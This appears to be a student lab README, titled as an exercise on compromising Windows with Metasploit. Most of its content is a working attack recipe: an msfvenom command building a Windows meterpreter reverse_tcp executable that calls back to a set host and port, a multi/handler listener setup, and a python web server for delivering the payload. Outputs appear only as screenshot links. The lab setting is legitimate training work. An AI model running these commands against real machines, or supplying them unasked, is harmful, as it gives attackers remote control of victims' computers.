# EX 6 Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.66.29 LPORT=1234 --platform=windows -f exe>open.exe```

```msfconsole -q```

```set PAYLOAD windows/meterpreter/reverse_tcp```

```use exploit/multi/handler```

```set LHOST 192.168.66.29```

```set LPORT 1234```

```run```

### OUTPUT:

![Screenshot 2025-04-19 140607](https://github.com/user-attachments/assets/ba478ca6-bdbd-43e7-868d-c4a250c49447)


```python3 -m http.server 5678```

### OUTPUT:

![image](https://github.com/user-attachments/assets/77693dcc-0ff9-410d-aaae-d6e90ecfe1c4)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
